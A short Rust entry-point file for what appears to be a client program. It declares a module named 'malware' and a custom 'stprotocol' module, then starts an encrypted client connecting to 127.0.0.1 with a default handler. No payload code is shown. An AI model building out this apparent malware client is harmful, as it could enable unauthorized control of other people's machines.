use stprotocol::{Client, Handlers};

mod malware;
mod stprotocol;
mod structure;
mod utility;

fn main() {
    let mut client = Client::new("127.0.0.1");
    client.use_encrypt(true);

    client.default_client_handler();
}